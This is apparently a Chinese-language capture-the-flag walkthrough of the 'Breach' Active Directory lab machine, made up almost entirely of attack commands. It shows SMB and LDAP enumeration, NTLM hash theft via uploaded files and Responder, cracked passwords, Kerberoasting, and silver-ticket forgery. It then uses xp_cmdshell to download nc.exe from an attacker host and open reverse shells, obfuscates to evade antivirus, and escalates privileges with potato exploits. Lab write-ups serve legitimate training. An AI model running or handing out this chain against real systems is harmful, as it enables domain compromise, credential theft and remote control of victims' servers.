针对目标服务器进行相应的端口探测

```
 sudo nmap -p- -vvv 10.10.92.109
```

![image-20241223165510098](https://s2.loli.net/2024/12/23/cVAUWlFbr5oCiO4.png)

针对目标服务器开放端口进行相应的服务探测

```
sudo nmap -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,3389,5985,9389,49664,49667,49669,55414,55636,55650 -A -sV 10.10.92.109 -oN Breach.txt
```

![image-20241223170158490](https://s2.loli.net/2024/12/23/BKT8DSA9MgHPif3.png)

优先根据扫描结果添加hosts文件

```
10.10.92.109 breach.vl
10.10.92.109 BREACHDC.breach.vl
```

优先针对smb服务进行匿名登录及相应的扫描工作

```
smbclient -L //10.10.92.109
```

![image-20241223171359690](https://s2.loli.net/2024/12/23/DmIeGaoZdRwMcfW.png)

```
netexec smb 10.10.92.109 -u guest -p '' --shares
```

![image-20241223171641293](https://s2.loli.net/2024/12/23/dWPyv4OY8kuGE1M.png)

```
netexec smb 10.10.92.109 -u guest -p '' --rid-brute
```

![image-20241223171911242](https://s2.loli.net/2024/12/23/MTKA8mVrDoFlCiS.png)

针对扫描得到的用户，通过脚本处理为一个users.txt

```
python3 getusername.py
```

![image-20241223172121576](https://s2.loli.net/2024/12/23/uD3hokqixLE6wIm.png)

```
enum4linux-ng 10.10.92.109 -A -C
```

![image-20241223172512688](https://s2.loli.net/2024/12/23/AP6KozH8fbvj9gi.png)

```
ldapsearch -x -s base namingcontexts -H ldap://10.10.92.109:389
```

![image-20241223173014858](https://s2.loli.net/2024/12/23/zSJCpMLEtT1POR3.png)

```
ldapsearch -x -b "DC=breach,DC=vl" -H ldap://10.10.92.109:389
```

![image-20241223173103440](https://s2.loli.net/2024/12/23/mUn6Xi2hR7FCvQ1.png)

使用我们获取到的用户清单，尝试AS-REP Roasting，因为目标端口开放了53和88端口，应当是DC域服务控制器

```
impacket-GetNPUsers breach.vl/ -usersfile users.txt -dc-ip 10.10.92.109
```

![image-20241223173731209](https://s2.loli.net/2024/12/23/QJrz6RIVWHyDqB4.png)

我们针对smb服务的信息收集，将目标关注放回分享的文件目录

```
smbclient -N //10.10.92.109/share
smbclient -N //10.10.92.109/Users
```

shares目录可以上传，我们尝试下上传文件，实现ntlm_theft

```
python3 /home/zkpc/Tools/ntlm_theft/ntlm_theft.py -g all -s 10.8.4.161 -f test
cd test
sudo responder -I tun0
smbclient -N //10.10.92.109/shared
prompt OFF
mput *
```

![image-20241223175815558](https://s2.loli.net/2024/12/23/tVYioSBjgHwc6kn.png)

获取到一个用户的hash，我们尝试针对哈希内容进行破解

```
Julia.Wong::BREACH:2d35b6c2f87b2cd8:275A5D72C1046B6261247AF466D04A04:
```

![image-20241223175940074](https://s2.loli.net/2024/12/23/KzUs5fihaAwmxP6.png)

username:Julia.Wong

password:Computer1

```
netexec winrm 10.10.92.109 -u Julia.Wong -p 'Computer1' 
```

![image-20241223180328150](https://files.seeusercontent.com/2026/04/08/3eJa/image-20241223180328150.png)

```
netexec ldap 10.10.92.109 -u Julia.Wong -p 'Computer1'
```

![image-20241223180341992](https://files.seeusercontent.com/2026/04/06/Va0m/image-20241223180341992.png)

```
netexec smb 10.10.92.109 -u Julia.Wong -p 'Computer1' --users
```

![image-20241223180533439](https://s2.loli.net/2024/12/23/cCYuesNmlW5kgId.png)

```
netexec smb 10.10.92.109 -u Julia.Wong -p 'Computer1' --shares
```

![image-20241223180610895](https://s2.loli.net/2024/12/23/lUk59pICqH21AyR.png)

![image-20241223180727808](https://s2.loli.net/2024/12/23/WVJOnldxGXI5YPL.png)

貌似第一个flag就能获取到

![image-20241223180805848](https://s2.loli.net/2024/12/23/3rH6uPX4YBSgmWd.png)

![](https://s2.loli.net/2024/12/23/O4mBQLgyhNs5wWT.png)

```
impacket-mssqlclient Julia.Wong:Computer1@10.10.92.109 -windows-auth
```

![image-20241223182743595](https://s2.loli.net/2024/12/23/T3xaekbIdA78ohu.png)

![image-20241223183646180](https://s2.loli.net/2024/12/23/6xAkjn5lez7bTIt.png)

```
certipy-ad find -dc-ip 10.10.92.109 -ns 10.10.92.109 -u Julia.Wong@breach.vl -p 'Computer1' -vulnerable -stdout
```

![image-20241223212449689](https://s2.loli.net/2024/12/23/VRnP2aTBSXsfK3J.png)

```
python3 /home/zkpc/Tools/krbrelayx/dnstool.py -u breach.vl\\Julia.Wong -p Computer1 --action add --record webtest --data 10.8.4.161  10.10.92.109
```

![image-20241223212716358](https://s2.loli.net/2024/12/23/3MrRvDHGOhady5z.png)

```
impacket-GetUserSPNs -request -dc-ip 10.10.92.109 breach.vl/Julia.Wong:Computer1 -save -outputfile GetUserSPNs.out
```

![image-20241223214135010](https://s2.loli.net/2024/12/23/qhLD6Wm32QjYOro.png)

我们尝试针对该hash进行破解

![image-20241223214213537](https://s2.loli.net/2024/12/23/be2XTmCQ1HVPShl.png)

user:svc_mssql

password:Trustno1

```
netexec winrm 10.10.92.109 -u svc_mssql -p 'Trustno1'
```

![image-20241223214344903](https://s2.loli.net/2024/12/23/gd13RvsmH4DkAyZ.png)

```
impacket-mssqlclient svc_mssql:Trustno1@10.10.92.109 -windows-auth
```

![image-20241223214451387](https://s2.loli.net/2024/12/23/zNDQ4wxJgaejRGs.png)

我们目前具有SPN passwordhash，domain SID，target SPN

SPN:MSSQLSvc/breachdc.breach.vl:1433

SID:S-1-5-21-2330692793-3312915120-706255856

passwordhash：69596C7AA1E8DAEE17F8E78870E25A5C

```
echo -n 'Trustno1' | iconv -f UTF-8 -t UTF-16LE | openssl dgst -md4
```

![image-20241223215758362](https://s2.loli.net/2024/12/23/f3Byrqjtek4mCZQ.png)

```
impacket-ticketer -nthash 69596C7AA1E8DAEE17F8E78870E25A5C -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -spn 'MSSQLSvc/breachdc.breach.vl:1433' -user-id 500 Administrator
```

![image-20241223220311917](https://s2.loli.net/2024/12/23/dRiJGcqN6KtP982.png)

```
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k -no-pass breachdc.breach.vl -windows-auth
```

![image-20241223225912756](https://s2.loli.net/2024/12/23/s81l4ZztfHrVycX.png)

```
enable_xp_cmdshell
xp_cmdshell whoami
```

![image-20241223230933332](https://s2.loli.net/2024/12/23/VvwuDpZstf9OSQa.png)

```
EXEC xp_cmdshell 'mkdir C:\Temp'
EXEC xp_cmdshell 'powershell -Command "iwr http://10.8.4.161/nc.exe -outfile C:\Temp\nc64.exe"'
xp_cmdshell powershell -ep bypass
xp_cmdshell dir "C:\Temp"
xp_cmdshell powershell -c "C:\Temp\nc64.exe -e cmd 10.8.4.161 443"
```

![image-20241223234534076](https://s2.loli.net/2024/12/23/tEI17BFwhLYKkeq.png)

目标服务器存在相应的反病毒软件，我们需要进行下混淆

```

sudo .venv/bin/python3 hoaxshell.py -s 10.8.4.161
exec xp_cmdshell 'powershell -e '
```

![image-20241224000437700](https://s2.loli.net/2024/12/24/m4jURW1wgMEubvZ.png)

成功获得相应的shell，我们开始进行提权

![image-20241224000513753](https://s2.loli.net/2024/12/24/29diOKY5AuXlmpB.png)

具备SeImpersonatePrivilege权限，我们可以使用工具提权

```
iwr http://10.8.4.161/PrintSpoofer64.exe -outfile PrintSpoofer.exe（报毒）
.\PrintSpoofer.exe -i -c cmd

iwr http://10.8.4.161/GodPotato-NET4.exe -outfile GodPotato.exe
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 10.8.4.161 80"(反弹总是失败，可能是端口等原因)
.\GodPotato.exe -cmd "cmd /c type c:\users\administrator\desktop\root.txt"
```

![image-20241224001751703](https://s2.loli.net/2024/12/24/bYFGPALxyhnsOzI.png)
